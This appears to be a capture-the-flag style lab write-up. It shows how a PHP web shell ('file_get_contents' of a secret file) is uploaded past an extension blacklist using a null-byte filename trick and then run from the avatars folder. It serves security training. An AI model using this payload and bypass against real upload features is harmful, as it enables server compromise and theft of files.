# Web shell upload via obfuscated file extension
* This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.
	* To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
	* You can log in to your own account using the following credentials: _wiener:peter_

### 1. Make a PHP payload to exfilterate the target file
* The file is saved as "file.php"
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
### 2. Try to uplaod the malicious PHP file
* Login as wiener and a file upload panel is found on "My account".

![86](https://user-images.githubusercontent.com/53956303/152077758-52fefe38-be4d-4b9b-a3b5-4ab3df5a32e3.png)
* When upload the file, an error message is given

![104](https://user-images.githubusercontent.com/53956303/152252314-89b2cb0d-8b14-4831-8161-4b78cf44c60a.png)
### 3. Send the _POST /my-account/avatar_ to repeater to test obfuscated file extension
* Since the server wants a file has _.jpg_ or _.png_ extension, Try to add a URL encoded Nullbyte `%00` between _.php_ and _.png extensions
```bash
file.php%00.png
```
* As a result, the file is uploaded as _file.php_

![105](https://user-images.githubusercontent.com/53956303/152253384-363ab297-ac54-4463-b438-71e2578162c1.png)
### 4. Execute via navigate to the file location using an web browser
* Navigate to
```http
https://ac1e1f8b1ef79382c03a7fd0000600b7.web-security-academy.net/files/avatars/file.php
```
* As a result, the php file is being executed and the key is given

![106](https://user-images.githubusercontent.com/53956303/152253572-d355e726-030e-421e-bea9-74df665d6125.png)
* By submitting the key, the lab is solved.

![107](https://user-images.githubusercontent.com/53956303/152253663-89501512-bede-462b-a417-120869272677.png)
